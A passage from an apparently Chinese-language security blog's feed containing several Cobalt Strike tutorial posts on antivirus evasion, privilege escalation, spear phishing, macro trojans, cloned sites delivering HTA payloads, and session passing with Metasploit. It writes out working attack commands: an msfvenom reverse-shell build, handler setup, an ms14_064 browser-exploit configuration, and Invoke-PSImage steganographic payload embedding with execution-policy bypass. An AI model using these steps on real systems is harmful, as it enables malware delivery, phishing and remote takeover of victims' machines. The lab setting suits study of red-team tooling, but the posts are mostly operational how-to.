          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt-Strike-九 免杀（一）</title>
      <link href="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/"/>
      <url>/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Veil免杀"><a href="#Veil免杀" class="headerlink" title="Veil免杀"></a>Veil免杀</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>网上有很多的安装方法：安装很简单输入命令<code>sudo apt install veil</code>然后一直确定下一步就可以了，安装时间较长</p><span id="more"></span><p><a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/34.html">安装方法</a></p><p>安装的过程中先使用CS生成一个payload</p><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603175954456.png" class="" title="image-20210603175954456"><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603180034103.png" class="" title="image-20210603180034103"><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>安装完成后输入<code>veil</code>可以启动veil工具</p><ul><li>安装完成可以看到有 Evasion和Ordnace 两个工具：Evasion是用来做==文件免杀==的一般来说选用的比较多</li></ul><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603172156128.png" class="" title="image-20210603172156128"><p>输入<code>use 1</code>选用Evasion</p><p><code>list</code>查看可用的payloads</p><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603173115641.png" class="" title="image-20210603173115641"><p>输入<code>use 17</code>这里我们选择一个go 的注入payload</p><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603175156926.png" class="" title="image-20210603175156926"><p>输入<code>generate</code>选择生成payload</p><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603175316286.png" class="" title="image-20210603175316286"><p>输入<code>3</code>选择自定义类型字符串，然后将我们前面生成的payload放进去回车执行</p><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603180319964.png" class="" title="image-20210603180319964"><p>然后再给输入个名字：不需要输入后缀名</p><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603180433135.png" class="" title="image-20210603180433135"><p>将生成后的文件拷贝出来拿到vt上查杀一下</p><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603180639766.png" class="" title="image-20210603180639766"><p>被一大半的杀软检测出来了(安装了360和火绒也过不去，会直接被检测出来)</p><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603180948241.png" class="" title="image-20210603180948241"><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210603181020402.png" class="" title="image-20210603181020402"><h1 id="HanzoInjection-方法"><a href="#HanzoInjection-方法" class="headerlink" title="HanzoInjection 方法"></a>HanzoInjection 方法</h1><p>HanzoIjection 是一种工具，专注于在内存中注入任意代码以绕过常见的防病毒解决方案</p><p><a href="https://github.com/P0cL4bs/hanzoInjection">下载链接</a></p><pre><code>Arguments Options:        OPTION        TYPE       DESCRIPTION       -e,--execute  [.raw]      Name of file.bin, payload metasploit type raw       -p,--payload  [.raw]      Payload meterpreter type [RAW]  requered parameter -o [output]       -o,--output   [file.cs]   Output generate project file.cs injection memory payload c#       -h,--help     [Help]      show this help and exitExample Usage:        HanzoInjection.exe -e payload_meterpreter.bin        HanzoInjection.exe -p meterpreter.bin -o injection_memory.cs</code></pre><ol><li><p>用CS先生成一个二进制的bin文件</p><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606165614118.png" class="" title="image-20210606165614118"></li><li><p>在安装过杀软的目标机器上用hanzoljection加载执行</p><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606165849918.png" class="" title="image-20210606165849918"></li><li><p>执行成功，并在服务端上线成功</p><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606170014912.png" class="" title="image-20210606170014912"></li></ol><h1 id="Invoke-PSImage"><a href="#Invoke-PSImage" class="headerlink" title="Invoke-PSImage"></a>Invoke-PSImage</h1><p>在 PNG 文件的像素中对 PowerShell 脚本进行编码，并生成要执行的 oneliner</p><p>Invoke-PSImage 使用 PowerShell 脚本并将脚本的字节编码为 PNG 图像的像素。它生成一个oneliner，用于从网络上的文件或文件中执行。</p><p>它可以仅使用有效载荷数据创建新图像，也可以将有效载荷嵌入现有图像的最低有效字节中，使其看起来像一张真实的图片。图像保存为 PNG，并且可以无损压缩而不会影响执行有效负载的能力，因为数据存储在颜色本身中。创建新图像时，普通的 PowerShell 脚本实际上会被显着压缩，通常会生成文件大小约为原始脚本 50% 的 png。</p><p>使用嵌入方法，每个像素中 2 个颜色值的最低有效 4 位用于保存有效负载。图像质量会因此而受到影响，但看起来仍然不错。它可以接受大多数图像类型作为输入，但输出将始终是 PNG，因为它需要无损。图像的每个像素用于保存一个字节的脚本，因此您将需要一个像素数至少与脚本中的字节数一样多的图像。这相当容易——例如，Invoke-Mimikatz 适合 1920x1200 图像。</p><p><a href="https://github.com/peewpw/Invoke-PSImage">下载地址</a></p><p>下载并解压后先往目录里面导入两个文件</p><ol><li><p>1920x1200的图片</p></li><li><p>cs生成的一个powershell脚本</p><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606174420618.png" class="" title="image-20210606174420618"></li><li><p>开始执行命令</p></li></ol><pre><code class="powershell">Powershell -ExecutionPolicy Bypass// 允许导入外部脚本执行Import-Module .\Invoke-PSImage.ps1Invoke-PSImage -Script .\payload.ps1 -Image .\test_1.jpg –Out test_2.png –web</code></pre><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606183056654.png" class="" title="image-20210606183056654"><ol start="4"><li>将图片上传至CS服务器</li></ol><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606183557547.png" class="" title="image-20210606183557547"><ol start="5"><li><p>执行完最后一条命令（时间比较久得几分钟）后会产生一个链接将链接复制出来</p></li><li><p>并且将圈起来的地方替换为我们cs服务端图片存放位置的链接</p></li></ol><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606183307333.png" class="" title="image-20210606183307333"><ol start="7"><li>替换后，在目标机上用powershell执行命令后可以看到360和火绒没有任何拦截上线成功</li></ol><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606183733739.png" class="" title="image-20210606183733739"><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606184238473.png" class="" title="image-20210606184238473"><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606184334467.png" class="" title="image-20210606184334467"><h1 id="python-生成免杀"><a href="#python-生成免杀" class="headerlink" title="python 生成免杀"></a>python 生成免杀</h1><p>生成python文件</p><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606185136044.png" class="" title="image-20210606185136044"><img src="/2021/06/03/Cobalt-Strike-%E4%B9%9D-%E5%85%8D%E6%9D%80/image-20210606185200136.png" class="" title="image-20210606185200136"><p>然后使用pyinstaller进行免杀</p><pre><code class="css">pyinstaller -F -w -i 1.exe payload.py-i 代表选取的图标的名字 也可以为1.ico-f 表示生成一个单的文件-w表示在windows环境下不打开窗口运行 payload.py即表示文件生成的</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt-Strike-八 提权</title>
      <link href="/2021/06/02/Cobalt-Strike-%E5%85%AB-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
      <url>/2021/06/02/Cobalt-Strike-%E5%85%AB-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
      
        <content type="html"><![CDATA[<p>提权顾名思义简单来说就是将普通用户的权限提升至管理员权限</p><span id="more"></span><h1 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h1><h2 id="什么是UAC"><a href="#什么是UAC" class="headerlink" title="什么是UAC"></a>什么是UAC</h2><p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。</p><h1 id="使用提权"><a href="#使用提权" class="headerlink" title="使用提权"></a>使用提权</h1><p>点击选择Elevate</p><img src="/2021/06/02/Cobalt-Strike-%E5%85%AB-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20210602205410874.png" class="" title="image-20210602205410874"><p>这里有两种默认自带的两种提权方式：直接选择使用，试过之后在win7上都可以成功提权</p><img src="/2021/06/02/Cobalt-Strike-%E5%85%AB-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20210602205919591.png" class="" title="image-20210602205919591"><h1 id="powerup提权"><a href="#powerup提权" class="headerlink" title="powerup提权"></a>powerup提权</h1><p>下载powershell脚本</p><p><code>https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</code></p><p>命令上传脚本</p><p><code>powershell-import</code></p><img src="/2021/06/02/Cobalt-Strike-%E5%85%AB-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20210602221955553.png" class="" title="image-20210602221955553"><p>执行上传的脚本</p><p><code>powershell invoke-allchecks</code></p><ul><li>未完待续</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt-Strike-七 Cobalt Strike鱼叉钓鱼</title>
      <link href="/2021/06/01/Cobalt-Strike-%E4%B8%83/"/>
      <url>/2021/06/01/Cobalt-Strike-%E4%B8%83/</url>
      
        <content type="html"><![CDATA[<h1 id="鱼叉钓鱼"><a href="#鱼叉钓鱼" class="headerlink" title="鱼叉钓鱼"></a>鱼叉钓鱼</h1><p>鱼叉式<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC/1401858">网络钓鱼</a>（Spear phishing）指一种源于亚洲与东欧只针对特定目标进行攻击的网络<a href="https://baike.baidu.com/item/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB">钓鱼攻击</a>。</p><p>鱼叉式网络钓鱼攻击针对特定组织内的特定目标个体。电子威胁 形势已发生了极大变化，从大量的垃圾邮件转向具有针对性的电 子邮件网络钓鱼活动，后者可对全球组织造成重大的财务、品牌和 运营损失。</p><p>例如，攻击者更加关注 高管和其他具有管理员权限的雇员，诱使其启动恶意软件，让犯罪 分子进入公司环境。这可能是勒索软件，先加密公司数据，然后借 机向受害者勒索费用。</p><span id="more"></span><h1 id="邮箱钓鱼模块使用"><a href="#邮箱钓鱼模块使用" class="headerlink" title="邮箱钓鱼模块使用"></a>邮箱钓鱼模块使用</h1><p>​cobalt strike提供了一个邮箱钓鱼模块</p><p>​我们来看一下这个模块怎么使用</p><img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602141841455.png" class="" title="image-20210602141841455"><h2 id="targets：创建一个新的文件"><a href="#targets：创建一个新的文件" class="headerlink" title="targets：创建一个新的文件"></a>targets：创建一个新的文件</h2><p>​填写的内容记得邮箱和名字之间用tab隔开</p><p>​<img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602150419372.png" class="" title="image-20210602150419372"></p><img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602150503064.png" class="" title="image-20210602150503064"><h2 id="template：找一个新的邮件"><a href="#template：找一个新的邮件" class="headerlink" title="template：找一个新的邮件"></a>template：找一个新的邮件</h2><h3 id="点击显示邮件原文"><a href="#点击显示邮件原文" class="headerlink" title="点击显示邮件原文"></a>点击显示邮件原文<img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602152733450.png" class="" title="image-20210602152733450"></h3><h3 id="将内容全部拷贝下来"><a href="#将内容全部拷贝下来" class="headerlink" title="将内容全部拷贝下来"></a>将内容全部拷贝下来</h3><img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602152941425.png" class="" title="image-20210602152941425"><h3 id="粘贴进文件中"><a href="#粘贴进文件中" class="headerlink" title="粘贴进文件中"></a>粘贴进文件中<img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602144146901.png" class="" title="image-20210602144146901"></h3><h3 id="填入文件路径"><a href="#填入文件路径" class="headerlink" title="填入文件路径"></a>填入文件路径</h3><img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602150537254.png" class="" title="image-20210602150537254"><h2 id="Attachment：这个可以用来上传附件，暂时先不用这个"><a href="#Attachment：这个可以用来上传附件，暂时先不用这个" class="headerlink" title="Attachment：这个可以用来上传附件，暂时先不用这个"></a>Attachment：这个可以用来上传附件，暂时先不用这个</h2><h2 id="Embed-URL：这里填入想跳转到的网址"><a href="#Embed-URL：这里填入想跳转到的网址" class="headerlink" title="Embed URL：这里填入想跳转到的网址"></a>Embed URL：这里填入想跳转到的网址</h2><h3 id="例如填写163邮箱的登陆页面"><a href="#例如填写163邮箱的登陆页面" class="headerlink" title="例如填写163邮箱的登陆页面"></a>例如填写163邮箱的登陆页面</h3><p>​<code>https://mail.163.com/</code></p><p>​<img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602150616327.png" class="" title="image-20210602150616327"></p><h2 id="填写发送邮箱的信息"><a href="#填写发送邮箱的信息" class="headerlink" title="填写发送邮箱的信息"></a>填写发送邮箱的信息</h2><p>​<img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602150246895.png" class="" title="image-20210602150246895"></p><h2 id="Bounce-To：填入自己的邮箱名"><a href="#Bounce-To：填入自己的邮箱名" class="headerlink" title="Bounce To：填入自己的邮箱名"></a>Bounce To：填入自己的邮箱名</h2><p>​<img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602150806718.png" class="" title="image-20210602150806718"></p><h2 id="点击send，发送成功后会在send-email窗口显示发送SUCCESS"><a href="#点击send，发送成功后会在send-email窗口显示发送SUCCESS" class="headerlink" title="点击send，发送成功后会在send email窗口显示发送SUCCESS"></a>点击send，发送成功后会在send email窗口显示发送SUCCESS</h2><p>​<img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602153953479.png" class="" title="image-20210602153953479"></p><h2 id="可以看到新收到的邮件"><a href="#可以看到新收到的邮件" class="headerlink" title="可以看到新收到的邮件"></a>可以看到新收到的邮件</h2><p>​<img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602153145875.png" class="" title="image-20210602153145875"></p><h2 id="邮件接收正常，在圈起来的部分可以看到是由我们自己的邮箱代发的"><a href="#邮件接收正常，在圈起来的部分可以看到是由我们自己的邮箱代发的" class="headerlink" title="邮件接收正常，在圈起来的部分可以看到是由我们自己的邮箱代发的"></a>邮件接收正常，在圈起来的部分可以看到是由我们自己的邮箱代发的</h2><img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602153305382.png" class="" title="image-20210602153305382"><h2 id="点击图片就会跳转到我们前面填入的163邮箱的登陆地址"><a href="#点击图片就会跳转到我们前面填入的163邮箱的登陆地址" class="headerlink" title="点击图片就会跳转到我们前面填入的163邮箱的登陆地址"></a>点击图片就会跳转到我们前面填入的163邮箱的登陆地址</h2><img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602153437496.png" class="" title="image-20210602153437496"><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​钓鱼右键这个功能可以配合上篇文章的网站克隆功能来使用，将我们克隆后的恶意填入Embed URL来获取信息。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt-Strike-六</title>
      <link href="/2021/05/31/Cobalt-Strike-%E5%85%AD/"/>
      <url>/2021/05/31/Cobalt-Strike-%E5%85%AD/</url>
      
        <content type="html"><![CDATA[<h2 id="Cobalt-Strike进行钓鱼攻击"><a href="#Cobalt-Strike进行钓鱼攻击" class="headerlink" title="Cobalt Strike进行钓鱼攻击"></a>Cobalt Strike进行钓鱼攻击</h2><h3 id="一-生成后门"><a href="#一-生成后门" class="headerlink" title="一. 生成后门"></a>一. 生成后门</h3><span id="more"></span><p>​以宏病毒为例</p><ol><li><p>宏病毒：点击选项卡生成office宏病毒，并选择一个合适的监听器，然后可以看到弹出下图的提示卡片</p><img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601150512845.png" class="" title="image-20210601150512845"><img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601150926236.png" class="" title="image-20210601150926236"></li><li><p>按照卡片提示，新建word文档，点击查看宏</p><img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601161854566.png" class="" title="image-20210601161854566"><p>2.1. 创建宏</p><img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601161943020.png" class="" title="image-20210601161943020"><p>2.2. 用CS生成的宏木马替换原有的宏代码</p><p>​<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601162319165.png" class="" title="image-20210601162319165"></p><p>2.3. 保存创建的word文档</p><p>​<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601162613290.png" class="" title="image-20210601162613290"></p></li><li><p>打卡word就能够看到已经上线</p><img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601162739069.png" class="" title="image-20210601162739069"></li></ol><h3 id="二-钓鱼模块"><a href="#二-钓鱼模块" class="headerlink" title="二. 钓鱼模块"></a>二. 钓鱼模块</h3><ol><li><p>web管理模块：可以看到我们生成的所有web模块</p><img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601170653789.png" class="" title="image-20210601170653789"><ol start="2"><li>克隆网站：对克隆网站进行键盘记录</li></ol><img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601175338884.png" class="" title="image-20210601175338884"><p>2.1. 在web log窗口可以看到我们在网页输入的内容</p><p>​<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601175614124.png" class="" title="image-20210601175614124"></p><img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601175646210.png" class="" title="image-20210601175646210"></li><li><p>克隆网站：执行下载木马</p><p>3.1 先来生成一个hta文件</p><p>​<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601181637920.png" class="" title="image-20210601181637920"></p><img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601181815662.png" class="" title="image-20210601181815662"><p>3.2. 然后将生成的hta文件托管到cs：修改一下Local URL的文件名</p><p>​<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601183016631.png" class="" title="image-20210601183016631"></p><img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601183300398.png" class="" title="image-20210601183300398"><p>3.3. 会生成一个url</p><p>​<code>http://192.168.3.8:80/update.hta</code></p><p>3.4. 选择克隆网站功能：填写要克隆的网站和用来下载的木马</p><p>​<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601183815033.png" class="" title="image-20210601183815033"></p><p>3.5. 选择好之后点击clone会生成一个新的链接</p><p>​<code>http://192.168.3.8:80/</code></p><img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601184218948.png" class="" title="image-20210601184218948"><p>3.6. 在浏览器输入链接：就会进入克隆的网页，并且下载病毒文件</p><p>​<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601184348590.png" class="" title="image-20210601184348590"></p></li><li><p>用metasploit溢出代码+CS进行钓鱼攻击</p><p>4.1. 用MSF生成溢出攻击的url</p><p>​<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601191121929.png" class="" title="image-20210601191121929"></p><p>4.2. 将生成的url放入到克隆网站的attack里面</p><p>​<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601191942438.png" class="" title="image-20210601191942438"></p><p>4.3. 在浏览器中输入生成的网址，就可以看到回连成功</p><p>​<img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601192102192.png" class="" title="image-20210601192102192"></p><img src="/2021/05/31/Cobalt-Strike-%E5%85%AD/image-20210601192224430.png" class="" title="image-20210601192224430"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt-Strike-五</title>
      <link href="/2021/05/28/Cobalt-Strike-%E4%BA%94/"/>
      <url>/2021/05/28/Cobalt-Strike-%E4%BA%94/</url>
      
        <content type="html"><![CDATA[<h2 id="Cobalt-Strike会话管理"><a href="#Cobalt-Strike会话管理" class="headerlink" title="Cobalt Strike会话管理"></a>Cobalt Strike会话管理</h2><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><table><thead><tr><th>系统</th><th>服务</th><th>ip</th></tr></thead><tbody><tr><td>kali</td><td>teamserver1</td><td>192.168.3.51</td></tr><tr><td>kali</td><td>teamserver2</td><td>192.168.3.8</td></tr><tr><td>win7</td><td>target</td><td>192.168.3.49</td></tr><tr><td>winXP</td><td>target</td><td>192.168.3.52</td></tr></tbody></table><span id="more"></span><h4 id="一-cs派生会话-会话备份"><a href="#一-cs派生会话-会话备份" class="headerlink" title="一. cs派生会话(会话备份)"></a>一. cs派生会话(会话备份)</h4><p>​可以增加自身会话，也可以将会话备份到其它teamserver，基本都是一样的操作</p><img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210528231421947.png" class="" title="image-20210528231421947"><img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210528231509051.png" class="" title="image-20210528231509051"><h4 id="二-cobalt-strike派生给metasploit会话"><a href="#二-cobalt-strike派生给metasploit会话" class="headerlink" title="二. cobalt strike派生给metasploit会话"></a>二. cobalt strike派生给metasploit会话</h4><ol><li><p>在msf中创建监听会话</p><pre><code>msf5 &gt; use exploit/multi/handler[*] Using configured payload windows/meterpreter/reverse_httpmsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost 192.168.3.51lhost =&gt; 192.168.3.51msf5 exploit(multi/handler) &gt; set lport 901lport =&gt; 901msf5 exploit(multi/handler) &gt; exploit -j[*] Exploit running as background job 5.[*] Exploit completed, but no session was created.[-] Handler failed to bind to 192.168.3.51:901:-  -[-] Handler failed to bind to 0.0.0.0:901:-  -[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:901).msf5 exploit(multi/handler) &gt; set lport 902lport =&gt; 902msf5 exploit(multi/handler) &gt; exploit -j[*] Exploit running as background job 6.[*] Exploit completed, but no session was created.[*] Started reverse TCP handler on 192.168.3.51:902 </code></pre></li><li><p>创建完成后在CS中创建监听会话因为上面我们在msf中创建的监听会话是tcp的所以在CS中也要同样创建tcp的监听</p><img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531150219471.png" class="" title="image-20210531150219471"></li><li><p>右键点击需要派生的shell，点击派生</p><img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531150701696.png" class="" title="image-20210531150701696"></li><li><p>选择我们刚刚配置的监听器</p><img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531150810902.png" class="" title="image-20210531150810902"></li><li><p>执行过后稍等一会儿MSF里面就会产生会话</p><img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531150940137.png" class="" title="image-20210531150940137"></li></ol><h4 id="三-metasploit生成木马，在CS上监听会话"><a href="#三-metasploit生成木马，在CS上监听会话" class="headerlink" title="三. metasploit生成木马，在CS上监听会话"></a>三. metasploit生成木马，在CS上监听会话</h4><ol><li><p>使用命令生成一个回连木马</p><p><code>msf5 &gt; msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.3.51 LPORT=903 -f exe &gt; /tmp/shell1.exe</code></p><img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531152527725.png" class="" title="image-20210531152527725"><ol start="2"><li>在cs创建监听器监听这个端口</li></ol><img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531152644410.png" class="" title="image-20210531152644410"><ol start="3"><li>把msf刚刚生成的木马拿到目标机上执行</li></ol><img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531152801125.png" class="" title="image-20210531152801125"><ol start="4"><li>可以看到在cs上返回了一个会话</li></ol><img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531152903656.png" class="" title="image-20210531152903656"></li></ol><h4 id="四-metasploit使用溢出exp与cobalt-strike会话"><a href="#四-metasploit使用溢出exp与cobalt-strike会话" class="headerlink" title="四. metasploit使用溢出exp与cobalt strike会话"></a>四. metasploit使用溢出exp与cobalt strike会话</h4><ol><li><p>使用MSF创建一个溢出类型的exp</p><pre><code>msf5 &gt; use exploit/windows/browser/ms14_064_ole_code_execution[*] Using configured payload windows/meterpreter/reverse_httpmsf5 exploit(windows/browser/ms14_064_ole_code_execution) &gt; set SRVHOST 192.168.3.51SRVHOST =&gt; 192.168.3.51msf5 exploit(windows/browser/ms14_064_ole_code_execution) &gt; set SRVPORT 80SRVPORT =&gt; 80msf5 exploit(windows/browser/ms14_064_ole_code_execution) &gt; set payload windows/meterpreter/reverse_httppayload =&gt; windows/meterpreter/reverse_httpmsf5 exploit(windows/browser/ms14_064_ole_code_execution) &gt; set LHOST 192.168.3.51LHOST =&gt; 192.168.3.51msf5 exploit(windows/browser/ms14_064_ole_code_execution) &gt; set LPORT 905LPORT =&gt; 905msf5 exploit(windows/browser/ms14_064_ole_code_execution) &gt; set disablepayloadhandler true// 不需要在metasploit框架内创建处理程序来服务有效负载连接disablepayloadhandler =&gt; truemsf5 exploit(windows/browser/ms14_064_ole_code_execution) &gt; set PrependMigrate true// 告诉metasploit框架修改其stager，以便在利用之后立即迁移到另一个进程PrependMigrate =&gt; truemsf5 exploit(windows/browser/ms14_064_ole_code_execution) &gt; exploit[*] Exploit running as background job 9.[*] Using URL: http://192.168.3.51:80/NqnvkKl[*] Server started.</code></pre><ol start="2"><li>在CS中创建http监听端口905</li></ol><img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531170120118.png" class="" title="image-20210531170120118"><ol start="3"><li>在xp虚拟机下打开这个上面我们生成的漏洞url（因为这个生成的漏洞只能在xp下生效）</li></ol><img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531170356982.png" class="" title="image-20210531170356982"><ol start="4"><li>在CS下可以看到回连消息</li></ol><img src="/2021/05/28/Cobalt-Strike-%E4%BA%94/image-20210531170530899.png" class="" title="image-20210531170530899"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt-Strike-四</title>
      <link href="/2021/05/28/Cobalt-Strike-%E5%9B%9B/"/>
      <url>/2021/05/28/Cobalt-Strike-%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="Cobalt-Strike用户驱动攻击"><a href="#Cobalt-Strike用户驱动攻击" class="headerlink" title="Cobalt Strike用户驱动攻击"></a>Cobalt Strike用户驱动攻击</h2><p>使用cs生成木马让目标机上线后</p><p>有很多用户驱动攻击的模块可以使用</p><span id="more"></span><img src="/2021/05/28/Cobalt-Strike-%E5%9B%9B/image-20210528164836829.png" class="" title="image-20210528164836829"><p>这里可以修改sleep的时间：获取信息的间隔时间/s</p><img src="/2021/05/28/Cobalt-Strike-%E5%9B%9B/image-20210528164602695.png" class="" title="image-20210528164602695">]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike(三)</title>
      <link href="/2021/05/26/Cobalt-Strike-%E4%B8%89/"/>
      <url>/2021/05/26/Cobalt-Strike-%E4%B8%89/</url>
      
